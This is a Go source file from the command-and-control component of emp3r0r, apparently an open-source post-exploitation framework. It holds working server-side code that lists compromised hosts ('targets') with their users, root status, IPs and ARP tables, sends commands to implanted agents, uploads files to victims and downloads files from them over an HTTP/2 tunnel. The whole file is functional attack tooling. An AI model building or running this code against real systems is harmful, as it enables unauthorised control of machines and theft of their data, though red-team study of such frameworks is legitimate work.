package cc

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

var (
	// DebugLevel what kind fof logs do we want to see
	// 0 (INFO) -> 1 (WARN) -> 2 (ERROR)
	DebugLevel = 0

	// IsAPIEnabled Indicate whether we are in headless mode
	IsAPIEnabled = false

	// EmpRoot root directory of emp3r0r
	EmpRoot, _ = os.Getwd()

	// Targets target list, with control (tun) interface
	Targets = make(map[*agent.SystemInfo]*Control)
)

const (
	// Temp where we save temp files
	Temp = "/tmp/emp3r0r/"

	// WWWRoot host static files for agent
	WWWRoot = Temp + tun.FileAPI

	// FileGetDir where we save #get files
	FileGetDir = "file-get/"
)

// Control controller interface of a target
type Control struct {
	Index int
	Conn  *h2conn.Conn
}

// send JSON encoded target list to frontend
func headlessListTargets() (err error) {
	var targets []agent.SystemInfo
	for target := range Targets {
		targets = append(targets, *target)
	}
	data, err := json.Marshal(targets)
	if err != nil {
		return
	}
	var resp APIResponse
	resp.Cmd = "ls_targets"
	resp.MsgData = data
	resp.MsgType = JSON
	resp.Alert = false
	respdata, err := json.Marshal(resp)
	if err != nil {
		return
	}
	_, err = APIConn.Write([]byte(respdata))
	return
}

// ListTargets list currently connected agents
func ListTargets() {
	// return JSON data to APIConn in headless mode
	if IsAPIEnabled {
		if err := headlessListTargets(); err != nil {
			CliPrintError("ls_targets: %v", err)
		}
	}

	color.Cyan("Connected agents\n")
	color.Cyan("=================\n\n")

	indent := strings.Repeat(" ", len(" [0] "))
	for target, control := range Targets {
		hasInternet := color.HiRedString("NO")
		if target.HasInternet {
			hasInternet = color.HiGreenString("YES")
		}

		// split long lines
		splitLongLine := func(line string, titleLen int) (ret string) {
			if len(line) < 55 {
				return line
			}
			ret = line[:55]
			for i := 1; i <= len(line)/55; i++ {
				if i == 4 {
					break
				}
				endslice := 55 * (i + 1)
				if endslice >= len(line) {
					endslice = len(line)
				}
				ret += fmt.Sprintf("\n%s%s", strings.Repeat(" ", 25-titleLen), line[55*i:endslice])
			}

			return
		}
		arpTab := splitLongLine(strings.Join(target.ARP, ", "), 4)
		ips := splitLongLine(strings.Join(target.IPs, ", "), 4)
		target.User = splitLongLine(target.User, 5)
		userInfo := color.HiRedString(target.User)
		if target.HasRoot {
			userInfo = color.HiGreenString(target.User)
		}
		cpuinfo := color.HiMagentaString(splitLongLine(target.CPU, 4))

		// agent process info
		agentProc := *target.Process
		procInfo := splitLongLine(fmt.Sprintf("%s (%d) <- %s (%d)",
			agentProc.Cmdline, agentProc.PID, agentProc.Parent, agentProc.PPID), 4)

		// info map
		infoMap := map[string]string{
			"Hostname":  color.HiCyanString(splitLongLine(target.Hostname, 3)),
			"Process":   color.HiMagentaString(procInfo),
			"User":      userInfo,
			"Internet":  hasInternet,
			"CPU":       cpuinfo,
			"MEM":       target.Mem,
			"Hardware":  color.HiCyanString(target.Hardware),
			"Container": target.Container,
			"OS":        color.HiWhiteString(target.OS),
			"Kernel":    color.HiBlueString(target.Kernel) + ", " + color.HiWhiteString(target.Arch),
			"From":      color.HiYellowString(target.IP) + fmt.Sprintf(" - %s", color.HiGreenString(target.Transport)),
			"IPs":       color.BlueString(ips),
			"ARP":       color.HiWhiteString(arpTab),
		}

		// print
		fmt.Printf(" [%s] Tag: %s", color.CyanString("%d", control.Index), strings.Repeat(" ", (14-len("Tag")))+
			color.CyanString(splitLongLine(target.Tag, 3)))

		for key, val := range infoMap {
			fmt.Printf("\n%s%s:%s%s", indent, key, strings.Repeat(" ", (15-len(key))), val)
		}
		fmt.Print("\n\n\n\n")
	}
}

// GetTargetFromIndex find target from Targets via control index
func GetTargetFromIndex(index int) (target *agent.SystemInfo) {
	for t, ctl := range Targets {
		if ctl.Index == index {
			target = t
			break
		}
	}
	return
}

// GetTargetFromTag find target from Targets via tag
func GetTargetFromTag(tag string) (target *agent.SystemInfo) {
	for t := range Targets {
		if t.Tag == tag {
			target = t
			break
		}
	}
	return
}

// ListModules list all available modules
func ListModules() {
	CliPrettyPrint("Module Name", "Help", &agent.ModuleDocs)
}

// Send2Agent send MsgTunData to agent
func Send2Agent(data *agent.MsgTunData, agent *agent.SystemInfo) (err error) {
	ctrl := Targets[agent]
	if ctrl == nil {
		return errors.New("Send2Agent: Target is not connected")
	}
	out := json.NewEncoder(ctrl.Conn)

	err = out.Encode(data)
	return
}

// PutFile put file to agent
func PutFile(lpath, rpath string, a *agent.SystemInfo) error {
	// open and read the target file
	f, err := os.Open(lpath)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}
	bytes, err := ioutil.ReadAll(f)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}

	// file sha256sum
	sum := sha256.Sum256(bytes)

	// file size
	size := len(bytes)
	sizemB := float32(size) / 1024 / 1024
	CliPrintInfo("\nPutFile:\nUploading '%s' to\n'%s' "+
		"on %s, agent [%d]\n"+
		"size: %d bytes (%.2fMB)\n"+
		"sha256sum: %x",
		lpath, rpath,
		a.IP, Targets[a].Index,
		size, sizemB,
		sum,
	)

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	fileData := agent.MsgTunData{
		Payload: "FILE" + agent.OpSep + rpath + agent.OpSep + payload,
		Tag:     a.Tag,
	}

	// send
	err = Send2Agent(&fileData, a)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}
	return nil
}

// StatFile Get stat info of a file on agent
func StatFile(filepath string, a *agent.SystemInfo) (fi *util.FileStat, err error) {
	cmd := fmt.Sprintf("!stat %s %s", filepath, uuid.NewString())
	err = SendCmd(cmd, a)
	if err != nil {
		return
	}
	var fileinfo util.FileStat

	defer func() {
		CmdResultsMutex.Lock()
		delete(CmdResults, cmd)
		CmdResultsMutex.Unlock()
	}()

	for {
		time.Sleep(100 * time.Millisecond)
		res, exists := CmdResults[cmd]
		if exists {
			err = json.Unmarshal([]byte(res), &fileinfo)
			if err != nil {
				return
			}
			fi = &fileinfo
			break
		}
	}

	return
}

// GetFile get file from agent
func GetFile(filepath string, a *agent.SystemInfo) error {
	if !util.IsFileExist(FileGetDir) {
		err := os.MkdirAll(FileGetDir, 0700)
		if err != nil {
			return fmt.Errorf("GetFile mkdir %s: %v", FileGetDir, err)
		}
	}
	var data agent.MsgTunData
	filename := FileGetDir + util.FileBaseName(filepath) // will copy the downloaded file here when we are done
	tempname := filename + ".downloading"                // will be writing to this file

	// stat target file, know its size, and allocate the file on disk
	fi, err := StatFile(filepath, a)
	if err != nil {
		return fmt.Errorf("GetFile: failed to stat %s: %v", filepath, err)
	}
	fileinfo := *fi
	filesize := fileinfo.Size
	err = util.FileAllocate(filename, filesize)
	if err != nil {
		return fmt.Errorf("GetFile: %s allocate file: %v", filepath, err)
	}
	CliPrintInfo("We will be downloading %s, %d bytes in total", filepath, filesize)

	// what if we have downloaded part of the file
	var offset int64 = 0
	if util.IsFileExist(tempname) {
		fiTotal, err := os.Stat(filename)
		if err != nil {
			CliPrintWarning("GetFile: read %s: %v", filename, err)
		}
		fiHave, err := os.Stat(tempname)
		if err != nil {
			CliPrintWarning("GetFile: read %s: %v", tempname, err)
		}
		offset = fiTotal.Size() - fiHave.Size()
	}

	// tell agent where to seek the left bytes
	cmd := fmt.Sprintf("#get %s %d", filepath, offset)

	data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, cmd)
	data.Tag = a.Tag
	err = Send2Agent(&data, a)
	if err != nil {
		CliPrintError("GetFile: %v", err)
		return err
	}
	return nil
}
